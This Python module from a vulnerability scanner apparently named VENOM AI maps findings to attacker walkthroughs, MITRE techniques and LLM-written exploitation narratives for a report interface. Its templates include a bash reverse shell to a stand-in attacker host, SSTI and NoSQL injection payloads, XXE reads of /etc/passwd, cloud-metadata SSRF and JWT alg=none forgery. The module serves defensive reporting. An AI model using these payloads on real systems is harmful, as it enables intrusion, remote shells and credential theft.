"""
VENOM AI — Attack Chain Graph Builder
─────────────────────────────────────────────────────────────────────────
Turns a flat list of findings into structured attack chains:

  Entry Point → Tool/Technique → Vulnerability → Impact → Pivot

For each chain we produce:
  • Step-by-step attacker walkthrough (what they'd actually do)
  • Tool name the attacker would use (sqlmap, Burp, nmap, manual curl, etc.)
  • MITRE ATT&CK technique mapping
  • Combined risk score
  • AI-generated narrative ("How would a hacker exploit this?")

The frontend renders these as expandable graph nodes the user can drill into.
"""
from __future__ import annotations

import logging
import os
from typing import List, Dict, Optional
from urllib.parse import urlparse

logger = logging.getLogger("venom.attack_chain")


# ── Per-OWASP attack technique templates ────────────────────────────────────
# Each entry: (entry_point, tools, attacker_steps, mitre_technique, impact)
TECHNIQUE_TEMPLATES = {
    "A05/sql_injection": {
        "entry_point": "User input field accepting unfiltered text",
        "tools":       ["sqlmap", "Burp Suite", "manual curl"],
        "attacker_steps": [
            "Identify a parameter that reflects errors or behaves differently with quotes",
            "Test for error-based, boolean-based, or time-based SQL injection",
            "Use sqlmap to automate extraction: sqlmap -u <url> --dbs",
            "Enumerate databases, tables, then dump rows (--dump)",
            "Look for users/passwords/sessions tables",
            "If DBA permissions: write a file or run OS commands via xp_cmdshell",
        ],
        "mitre":       "T1190 — Exploit Public-Facing Application",
        "impact":      "Full database read/write. Often leads to RCE via UDF or file writes.",
    },
    "A05/xss": {
        "entry_point": "Reflected input on HTML page",
        "tools":       ["Burp Suite", "BeEF", "custom JavaScript payloads"],
        "attacker_steps": [
            "Confirm payload is rendered without HTML encoding",
            "Craft payload to steal session cookies or perform actions on victim's behalf",
            "Host malicious payload on attacker-controlled site",
            "Phish target into clicking link with payload in URL",
            "Victim's browser executes JS → session token exfiltrated",
            "Attacker uses stolen session to impersonate victim",
        ],
        "mitre":       "T1059.007 — JavaScript",
        "impact":      "Session theft, account takeover, defacement, malware delivery.",
    },
    "A05/command_injection": {
        "entry_point": "Parameter passed to shell command",
        "tools":       ["manual curl", "Commix"],
        "attacker_steps": [
            "Detect timing oracle: inject `; sleep 5` → response delays",
            "Confirm OS command execution",
            "Start reverse shell: `; bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'`",
            "Get shell access to server",
            "Enumerate the host, escalate privileges",
            "Pivot to internal network",
        ],
        "mitre":       "T1059 — Command and Scripting Interpreter",
        "impact":      "Full server compromise. Direct RCE = catastrophic.",
    },
    "A05/ssti": {
        "entry_point": "User input rendered through template engine",
        "tools":       ["tplmap", "Burp Suite"],
        "attacker_steps": [
            "Confirm template expression evaluates: {{7*7}} → 49",
            "Identify the template engine (Jinja2/Twig/Freemarker)",
            "Use engine-specific payloads for RCE: e.g., Jinja2 sandboxes",
            "Read filesystem: {{ ''.__class__.__mro__[2].__subclasses__() }}",
            "Execute arbitrary code on the server",
            "Establish persistence",
        ],
        "mitre":       "T1190 — Exploit Public-Facing Application",
        "impact":      "Often leads to remote code execution.",
    },
    "A05/nosql_injection": {
        "entry_point": "JSON body field in login or query endpoint",
        "tools":       ["manual curl", "NoSQLMap"],
        "attacker_steps": [
            "Send JSON with operators: {\"$ne\": null} as password",
            "Observe auth bypass on login form",
            "Use $where injection to evaluate JavaScript on MongoDB",
            "Extract data via boolean-based blind techniques",
        ],
        "mitre":       "T1190 — Exploit Public-Facing Application",
        "impact":      "Authentication bypass, full database exfiltration.",
    },
    "A05/xxe": {
        "entry_point": "XML body parsing endpoint",
        "tools":       ["manual curl", "Burp Suite"],
        "attacker_steps": [
            "Send XML with external entity referring to file:///etc/passwd",
            "Server-side XML parser fetches and includes file content",
            "Exfiltrate /etc/passwd, SSH keys, application secrets",
            "Pivot to SSRF via http:// URIs in entities",
        ],
        "mitre":       "T1190 — Exploit Public-Facing Application",
        "impact":      "Local file disclosure, SSRF, occasional RCE.",
    },
    "A01/idor": {
        "entry_point": "Numeric ID in URL path or query string",
        "tools":       ["manual curl", "Burp Suite Intruder", "ffuf"],
        "attacker_steps": [
            "Note URL pattern: /api/users/123",
            "Replace 123 with 1, 2, 3 — same response shape = IDOR",
            "Automate enumeration with Burp Intruder or sqlmap-style script",
            "Harvest all victim records including PII and credentials",
        ],
        "mitre":       "T1078 — Valid Accounts",
        "impact":      "Mass data exfiltration. Every user's data leaked.",
    },
    "A01/ssrf": {
        "entry_point": "URL/URI parameter accepting external links",
        "tools":       ["manual curl", "Burp Collaborator"],
        "attacker_steps": [
            "Identify parameter passing URL server-side (image fetcher, webhook, etc.)",
            "Inject internal targets: http://localhost:8080, http://169.254.169.254/",
            "Hit cloud metadata service → steal IAM credentials",
            "Use stolen creds to take over the cloud account",
            "Pivot to internal services on 10.x.x.x",
        ],
        "mitre":       "T1190 — Exploit Public-Facing Application",
        "impact":      "Cloud account takeover, internal network exposure.",
    },
    "A01/forced_browsing": {
        "entry_point": "Web server",
        "tools":       ["ffuf", "gobuster", "manual curl"],
        "attacker_steps": [
            "Wordlist-fuzz the target for admin/backup paths",
            "Find /admin returning 200, /.env returning DB credentials",
            "Read /.env → harvest secrets",
            "Use harvested credentials to log into admin panel",
            "Full application compromise from public, unauthenticated paths",
        ],
        "mitre":       "T1083 — File and Directory Discovery",
        "impact":      "Credential theft, source code leak, backup database access.",
    },
    "A01/jwt": {
        "entry_point": "Authorization header / cookie carrying a JWT",
        "tools":       ["jwt_tool", "manual curl"],
        "attacker_steps": [
            "Capture a valid JWT (from cookie or Authorization header)",
            "Decode JWT to identify header.alg field",
            "Modify header to set alg=none and remove signature",
            "Replay request — if accepted, server doesn't verify signature",
            "Modify JWT payload to impersonate admin: {\"role\": \"admin\"}",
            "Full account/role takeover",
        ],
        "mitre":       "T1556 — Modify Authentication Process",
        "impact":      "Total authentication bypass.",
    },
    "A02/default_credentials": {
        "entry_point": "Login form",
        "tools":       ["Hydra", "manual login"],
        "attacker_steps": [
            "Try admin/admin, admin/password, admin/admin123",
            "Authenticate as administrator",
            "Take complete control of the application",
        ],
        "mitre":       "T1078.001 — Default Accounts",
        "impact":      "Total administrative compromise — no exploit needed.",
    },
    "A02/exposed_file": {
        "entry_point": "Web server with config or backup file in webroot",
        "tools":       ["manual curl"],
        "attacker_steps": [
            "Request /.env directly",
            "Download production environment variables",
            "Extract database password, API keys, secret tokens",
            "Use harvested credentials to access database, cloud APIs, internal services",
        ],
        "mitre":       "T1552.001 — Credentials In Files",
        "impact":      "Cascading compromise via stolen credentials.",
    },
    "A02/cors": {
        "entry_point": "Origin header in AJAX requests",
        "tools":       ["malicious website with JS"],
        "attacker_steps": [
            "Host a malicious page on attacker.com",
            "Page makes authenticated cross-origin AJAX call to target",
            "Target's CORS policy reflects origin + allows credentials",
            "Attacker's JS reads response and exfiltrates user data",
            "Victim only had to visit attacker's site",
        ],
        "mitre":       "T1185 — Browser Session Hijacking",
        "impact":      "Cross-origin data theft, account takeover via authenticated requests.",
    },
    "A02/debug_page": {
        "entry_point": "Any URL triggering an error",
        "tools":       ["manual curl"],
        "attacker_steps": [
            "Force errors with malformed input",
            "Capture leaked source paths, framework versions, env vars",
            "Identify exact framework and version → CVE search",
            "Use disclosed file paths in path traversal / LFI attacks",
        ],
        "mitre":       "T1592.002 — Software (Reconnaissance)",
        "impact":      "Information disclosure enables targeted next-stage attacks.",
    },
    "A04/https_not_enforced": {
        "entry_point": "Public WiFi or hostile network",
        "tools":       ["bettercap", "mitmproxy"],
        "attacker_steps": [
            "Position as MITM (public WiFi, ARP poisoning, rogue router)",
            "User connects via HTTP — no TLS",
            "Intercept session cookies and credentials in plaintext",
            "Replay session — impersonate victim",
        ],
        "mitre":       "T1557 — Adversary-in-the-Middle",
        "impact":      "Session hijacking, credential interception.",
    },
    "A04/insecure_cookie": {
        "entry_point": "Cross-site scripting OR network MITM",
        "tools":       ["XSS payload", "MITM tools"],
        "attacker_steps": [
            "Identify cookie missing HttpOnly → readable from JS",
            "Combine with any XSS to steal session cookie via document.cookie",
            "Alternative: if no Secure flag, sniff cookie over HTTP",
            "Replay cookie to take over session",
        ],
        "mitre":       "T1539 — Steal Web Session Cookie",
        "impact":      "Session takeover.",
    },
    "A04/ssl_expired": {
        "entry_point": "Public TLS endpoint",
        "tools":       ["browser warning, MITM proxy"],
        "attacker_steps": [
            "Users see browser warnings and click through them (training effect)",
            "Attacker presents their own cert and intercepts traffic",
            "Users ignore the warning and submit credentials",
        ],
        "mitre":       "T1557 — Adversary-in-the-Middle",
        "impact":      "Easy MITM after trust collapse.",
    },

    # ── A03 Supply Chain ────────────────────────────────────────────────
    "A03/vulnerable_lib": {
        "entry_point": "Outdated client-side JavaScript library",
        "tools":       ["Retire.js", "npm audit", "public CVE PoCs"],
        "attacker_steps": [
            "Fingerprint the library version from the page source",
            "Look up known CVEs for that exact version (osv.dev, Snyk)",
            "Grab a public proof-of-concept exploit for the CVE",
            "Craft input that triggers the library's known flaw (XSS, prototype pollution, ReDoS)",
            "Deliver it to victims who load the vulnerable script",
        ],
        "mitre":       "T1195.002 — Compromise Software Supply Chain",
        "impact":      "Client-side code execution, DOM XSS, or DoS via a dependency CVE.",
    },
    "A03/exposed_manifest": {
        "entry_point": "Publicly readable package manifest",
        "tools":       ["manual curl", "osv.dev", "Snyk"],
        "attacker_steps": [
            "Download the exposed manifest (package.json / composer.lock / requirements.txt)",
            "Read the exact pinned version of every dependency",
            "Cross-reference each version against vulnerability databases",
            "Pick the dependency with the most severe known CVE",
            "Launch a targeted exploit for that specific version",
        ],
        "mitre":       "T1592.002 — Software (Reconnaissance)",
        "impact":      "Attacker gets a precise map of exploitable dependencies.",
    },
    "A03/missing_sri": {
        "entry_point": "Third-party CDN script without integrity hash",
        "tools":       ["CDN compromise", "MITM proxy"],
        "attacker_steps": [
            "Identify a <script> loaded from a CDN with no integrity= attribute",
            "Compromise the CDN, or MITM the connection",
            "Swap the legitimate script for malicious JavaScript",
            "Every visitor's browser silently executes the attacker's code",
        ],
        "mitre":       "T1195.002 — Compromise Software Supply Chain",
        "impact":      "Mass compromise of all users via a single poisoned dependency.",
    },

    # ── A06 Insecure Design ─────────────────────────────────────────────
    "A06/csrf": {
        "entry_point": "State-changing form without an anti-CSRF token",
        "tools":       ["malicious auto-submitting HTML page"],
        "attacker_steps": [
            "Build a hidden form on attacker.com that POSTs to the target action",
            "Set the fields to the attacker's desired values (change email, transfer, etc.)",
            "Auto-submit it with JavaScript when the victim visits",
            "Victim's browser sends the request with their session cookie",
            "The action executes as the victim, no CSRF token to stop it",
        ],
        "mitre":       "T1204 — User Execution",
        "impact":      "Attacker forces logged-in users to perform unwanted state changes.",
    },
    "A06/no_rate_limit": {
        "entry_point": "Login / sensitive endpoint with no throttling",
        "tools":       ["Hydra", "Burp Intruder", "credential-stuffing lists"],
        "attacker_steps": [
            "Confirm the endpoint never blocks repeated attempts",
            "Load a wordlist / breached-credential list",
            "Automate thousands of login attempts per minute",
            "Crack weak accounts via brute force or credential stuffing",
        ],
        "mitre":       "T1110 — Brute Force",
        "impact":      "Mass account takeover of weak/reused credentials.",
    },
    "A06/business_logic": {
        "entry_point": "Numeric field trusting client-side validation",
        "tools":       ["Burp Suite", "manual request editing"],
        "attacker_steps": [
            "Intercept the request and edit the numeric value (e.g. quantity=-1)",
            "Server accepts the invalid value with no bounds checking",
            "Abuse the logic (negative refund, price manipulation, free items)",
        ],
        "mitre":       "T1565.001 — Stored Data Manipulation",
        "impact":      "Financial loss / inventory abuse via crafted business-logic values.",
    },

    # ── A07 Authentication Failures ─────────────────────────────────────
    "A07/user_enum": {
        "entry_point": "Login/reset flow that reveals valid usernames",
        "tools":       ["Burp Intruder", "manual curl"],
        "attacker_steps": [
            "Submit logins with fake vs real usernames",
            "Observe the different response (message, status, or timing)",
            "Enumerate a validated list of real accounts",
            "Feed that list into targeted brute-force / phishing",
        ],
        "mitre":       "T1589.002 — Gather Victim Identity (Email Addresses)",
        "impact":      "Validated account list enabling targeted attacks.",
    },
    "A07/session_in_url": {
        "entry_point": "Session/auth token carried in the URL",
        "tools":       ["log access", "referer sniffing", "browser history"],
        "attacker_steps": [
            "Obtain a URL containing the session token (logs, referer, shared link)",
            "Extract the token from the query string",
            "Replay it to hijack the victim's authenticated session",
        ],
        "mitre":       "T1539 — Steal Web Session Cookie",
        "impact":      "Session hijacking via leaked URL tokens.",
    },
    "A07/http_login": {
        "entry_point": "Login form submitting over plaintext HTTP",
        "tools":       ["Wireshark", "bettercap", "mitmproxy"],
        "attacker_steps": [
            "Position on the network path (public WiFi, ARP spoof)",
            "Capture the plaintext HTTP login request",
            "Read the username and password directly off the wire",
        ],
        "mitre":       "T1040 — Network Sniffing",
        "impact":      "Direct credential theft over the network.",
    },

    # ── A08 Integrity Failures ──────────────────────────────────────────
    "A08/deserialization": {
        "entry_point": "Endpoint that deserializes untrusted objects",
        "tools":       ["ysoserial", "phpggc", "manual gadget chains"],
        "attacker_steps": [
            "Identify the serialization format (Java/PHP/.NET/pickle)",
            "Build a malicious serialized 'gadget chain' payload",
            "Submit it where the app deserializes input",
            "The deserializer instantiates attacker objects → code execution",
        ],
        "mitre":       "T1059 — Command and Scripting Interpreter",
        "impact":      "Remote code execution via insecure deserialization.",
    },
    "A08/source_map": {
        "entry_point": "Exposed JavaScript source map (.js.map)",
        "tools":       ["manual curl", "source-map tools"],
        "attacker_steps": [
            "Request the .map file next to a minified script",
            "Reconstruct the original, commented source code",
            "Read internal logic, hidden endpoints, and any embedded secrets",
            "Use that knowledge to find deeper flaws",
        ],
        "mitre":       "T1592.002 — Software (Reconnaissance)",
        "impact":      "Full source disclosure aiding targeted attacks.",
    },
    "A08/cicd_exposed": {
        "entry_point": "Publicly readable CI/CD pipeline file",
        "tools":       ["manual curl"],
        "attacker_steps": [
            "Fetch the exposed pipeline file (.github/workflows, Jenkinsfile)",
            "Read build steps, secret variable names, and deploy targets",
            "Map the software supply chain for a poisoning attack",
        ],
        "mitre":       "T1195 — Supply Chain Compromise",
        "impact":      "Pipeline disclosure enabling supply-chain attacks.",
    },

    # ── A09 Logging & Alerting Failures ─────────────────────────────────
    "A09/no_detection": {
        "entry_point": "Application with no WAF / attack monitoring",
        "tools":       ["any attack tool — undetected"],
        "attacker_steps": [
            "Send blatant attack payloads (SQLi, XSS, traversal)",
            "Observe that none are blocked, logged-visibly, or alerted on",
            "Attack freely and slowly — nobody is watching",
            "Maintain long-term access; breach goes unnoticed",
        ],
        "mitre":       "T1562.008 — Impair Defenses (Disable Cloud Logs)",
        "impact":      "Attacks and breaches go undetected for extended periods.",
    },
    "A09/verbose_errors": {
        "entry_point": "Verbose error responses",
        "tools":       ["manual curl"],
        "attacker_steps": [
            "Send malformed input to force an error",
            "Read leaked stack traces, file paths, and framework details",
            "Use disclosed internals to plan the next attack stage",
        ],
        "mitre":       "T1592.002 — Software (Reconnaissance)",
        "impact":      "Information disclosure via unsanitised errors.",
    },

    # ── A10 Exception Mishandling ───────────────────────────────────────
    "A10/unhandled_exception": {
        "entry_point": "Input the app fails to handle gracefully",
        "tools":       ["manual curl", "fuzzers"],
        "attacker_steps": [
            "Send malformed input (null bytes, type confusion, broken JSON)",
            "Trigger an unhandled 500 error / stack trace",
            "Crash workers repeatedly for denial of service, or read the leaked trace",
            "Exploit any insecure state the failed request left behind",
        ],
        "mitre":       "T1499 — Endpoint Denial of Service",
        "impact":      "DoS, information leakage, or fail-open security state.",
    },
    "A10/http_trace": {
        "entry_point": "HTTP TRACE method enabled",
        "tools":       ["manual curl", "XST payload"],
        "attacker_steps": [
            "Send a TRACE request and confirm it echoes headers back",
            "Combine with another flaw to read HttpOnly cookies (XST)",
        ],
        "mitre":       "T1040 — Network Sniffing",
        "impact":      "Assists cookie/header theft in chained attacks.",
    },
}

# Map finding title prefixes / vuln types to a technique template key
def _technique_key_for(f: dict) -> Optional[str]:
    owasp = (f.get("owasp") or "").upper()
    title = (f.get("title") or "").lower()
    src   = (f.get("source_tool") or "").lower()

    if owasp == "A05":
        if "sql" in title or "sqli" in title:               return "A05/sql_injection"
        if "xss" in title:                                   return "A05/xss"
        if "command injection" in title:                     return "A05/command_injection"
        if "nosql" in title or "mongo" in title:             return "A05/nosql_injection"
        if "ssti" in title or "template injection" in title: return "A05/ssti"
        if "xxe" in title or "xml external" in title:        return "A05/xxe"
        return "A05/sql_injection"   # default A05 technique
    if owasp == "A01":
        if "idor" in title:                                  return "A01/idor"
        if "ssrf" in title:                                  return "A01/ssrf"
        if "jwt" in title or "alg=none" in title:            return "A01/jwt"
        if "sensitive path" in title or "exposed" in title:  return "A01/forced_browsing"
        return "A01/forced_browsing"
    if owasp == "A02":
        if "default credentials" in title or "default cred" in title: return "A02/default_credentials"
        if "exposed file" in title or "/.env" in title or "/.git" in title or "backup" in title:
            return "A02/exposed_file"
        if "cors" in title:                                  return "A02/cors"
        if "debug" in title or "stack trace" in title:       return "A02/debug_page"
        return "A02/exposed_file"
    if owasp == "A04":
        if "https not enforced" in title or "hsts" in title: return "A04/https_not_enforced"
        if "cookie" in title:                                return "A04/insecure_cookie"
        if "ssl certificate expired" in title:               return "A04/ssl_expired"
        return "A04/https_not_enforced"
    if owasp == "A03":
        if "manifest" in title:                              return "A03/exposed_manifest"
        if "sri" in title or "integrity" in title:           return "A03/missing_sri"
        return "A03/vulnerable_lib"
    if owasp == "A06":
        if "csrf" in title:                                  return "A06/csrf"
        if "rate limit" in title or "brute" in title:        return "A06/no_rate_limit"
        return "A06/business_logic"
    if owasp == "A07":
        if "enumeration" in title:                           return "A07/user_enum"
        if "url" in title:                                   return "A07/session_in_url"
        if "http" in title:                                  return "A07/http_login"
        return "A07/user_enum"
    if owasp == "A08":
        if "source map" in title:                            return "A08/source_map"
        if "ci/cd" in title or "cicd" in title:              return "A08/cicd_exposed"
        return "A08/deserialization"
    if owasp == "A09":
        if "verbose" in title or "error" in title:           return "A09/verbose_errors"
        return "A09/no_detection"
    if owasp == "A10":
        if "trace" in title:                                 return "A10/http_trace"
        return "A10/unhandled_exception"
    return None


# ── How VENOM itself DETECTED each class (the scanning technique used) ───────
# Keyed by OWASP category → (scan_technique, what_signal_confirmed_it).
DETECTION_METHODS = {
    "A01": ("Enumerated object IDs and probed 34 sensitive paths; swapped JWT alg to none; "
            "injected internal URLs for SSRF.",
            "A response for another user's ID, an exposed admin/config path, a cloud-metadata "
            "response, or an accepted unsigned token."),
    "A02": ("Requested ~30 known config/backup files, forced framework errors, and sent "
            "cross-origin + default-credential probes.",
            "A 200 response with real file content, a framework debug page, a reflected CORS "
            "origin, or a successful default login."),
    "A03": ("Fingerprinted JS library versions, probed 17 package-manifest paths, and checked "
            "CDN scripts for integrity hashes.",
            "A library version below the safe minimum, a readable manifest, or a CDN script "
            "with no Subresource Integrity."),
    "A04": ("Requested the HTTP version, inspected TLS certificate + protocol versions, and "
            "checked every session cookie's flags.",
            "HTTP served without redirect, a bad/expired cert, TLS 1.0 support, or a cookie "
            "missing Secure/HttpOnly/SameSite."),
    "A05": ("Injected SQL meta-characters, XSS/SSTI/command payloads and timing oracles into "
            "every parameter and form field.",
            "A database error, a reflected script payload, a template-math result (49), or a "
            "measurable time delay from a sleep payload."),
    "A06": ("Inspected forms for anti-CSRF tokens, sent an 8-attempt login burst, and submitted "
            "out-of-range numeric values.",
            "A state-changing form with no CSRF token, a login flow that never throttled, or a "
            "negative value accepted without validation."),
    "A07": ("Compared login responses for fake vs real usernames, scanned URLs for session "
            "tokens, and checked login transport.",
            "Different responses per username, a session/auth token in a URL, or a login form "
            "posting over plaintext HTTP."),
    "A08": ("Scanned responses/cookies for serialized-object signatures, probed for .js.map "
            "source maps, and requested CI/CD files.",
            "A serialized Java/PHP/.NET/pickle object, a readable source map, or an exposed "
            "build-pipeline file."),
    "A09": ("Fired 6 blatant attack payloads (SQLi, XSS, traversal, command injection) and "
            "watched for any protective response.",
            "None of the loud attacks were blocked, challenged, or rate-limited — indicating no "
            "WAF/attack detection."),
    "A10": ("Sent malformed input (null bytes, type confusion, broken JSON, oversized data) and "
            "unusual HTTP methods.",
            "An unhandled 500/stack trace instead of a clean 400, or TRACE reflecting the "
            "request back."),
}


def _ai_narrative_for_chain(chain: dict, target_url: str) -> str:
    """Optional Groq-driven narrative. Falls back to template steps if AI unavailable."""
    try:
        from groq import Groq
    except ImportError:
        return ""
    keys = []
    for v in ("GROQ_API_KEY", "GROQ_API_KEY_2", "GROQ_API_KEY_3", "GROQ_API_KEY_4"):
        k = os.getenv(v, "").strip()
        if k and not k.startswith("PASTE_"):
            keys.append(k)
    if not keys:
        return ""
    prompt = f"""You are a senior offensive security engineer. Tell a 4-sentence attack story
explaining how a hacker would EXPLOIT the following vulnerability on {target_url}.

Vulnerability: {chain.get('title', '')}
OWASP: {chain.get('owasp', '')}
Affected: {chain.get('affected_url', '')}
Payload that worked: {chain.get('payload', '')}
Tools usually used: {', '.join(chain.get('tools', []))}

Write 4 short, vivid sentences. Start with "Step 1:". No fluff. Mention real tool names.
"""
    try:
        client = Groq(api_key=keys[0])
        resp = client.chat.completions.create(
            model=os.getenv("GROQ_MODEL_FAST") or "llama-3.1-8b-instant",
            messages=[
                {"role": "system", "content": "You are a senior offensive security engineer."},
                {"role": "user", "content": prompt},
            ],
            max_tokens=350, temperature=0.5,
        )
        return (resp.choices[0].message.content or "").strip()
    except Exception:
        return ""


def build_attack_chains(findings: List[dict], target_url: str,
                         max_chains: int = 12) -> List[dict]:
    """
    Turn flat findings into structured attack chains.

    Each chain has:
      - title, severity, owasp, cwe_id, risk_score (from finding)
      - entry_point, tools[], attacker_steps[], mitre, impact (from template)
      - target_url, affected_url, payload (from finding)
      - ai_narrative (if Groq available)
      - finding_id (link back to finding)
    """
    if not findings:
        return []

    # Sort by risk_score desc so highest-impact chains come first
    sorted_f = sorted(
        [f for f in findings if (f.get("category") or "") == "vulnerability"],
        key=lambda f: -int(f.get("risk_score", 0) or 0),
    )

    chains = []
    seen_titles_per_owasp: Dict[str, set] = {}
    for f in sorted_f:
        if len(chains) >= max_chains:
            break
        key = _technique_key_for(f)
        if not key:
            continue
        owasp = f.get("owasp") or ""
        title = f.get("title") or ""
        # Don't repeat the SAME technique twice in one chain list
        seen = seen_titles_per_owasp.setdefault(owasp, set())
        if title in seen:
            continue
        seen.add(title)

        tpl = TECHNIQUE_TEMPLATES.get(key, {})
        det_technique, det_signal = DETECTION_METHODS.get(
            owasp, ("Sent targeted probes and analysed the responses.",
                    "A response pattern that confirmed the flaw."))
        chain = {
            "id":             f.get("id"),
            "finding_id":     f.get("id"),
            "owasp":          owasp,
            "title":          title,
            "severity":       f.get("severity"),
            "cwe_id":         f.get("cwe_id"),
            "risk_score":     f.get("risk_score"),
            "cvss_score":     f.get("cvss_score"),
            "target_url":     target_url,
            "affected_url":   f.get("affected_url"),
            "parameter":      f.get("parameter"),
            "payload":        f.get("payload"),
            "evidence":       f.get("evidence"),
            "verified":       bool(f.get("verified")),
            "entry_point":    tpl.get("entry_point") or "User-controlled input",
            "tools":          tpl.get("tools") or ["manual curl"],
            "attacker_steps": tpl.get("attacker_steps") or [],
            "mitre":          tpl.get("mitre") or "T1190 — Exploit Public-Facing Application",
            "impact":         tpl.get("impact") or f.get("impact") or "",
            # ── How VENOM detected it (the scan technique) ──────────────
            "how_venom_detected": det_technique,
            "detection_signal":   det_signal,
            "payload_used":       f.get("payload") or "",
            "evidence_found":     f.get("evidence") or "",
        }
        # Optional AI narrative — best-effort, don't block on it
        try:
            chain["ai_narrative"] = _ai_narrative_for_chain(chain, target_url)
        except Exception:
            chain["ai_narrative"] = ""
        chains.append(chain)
    return chains
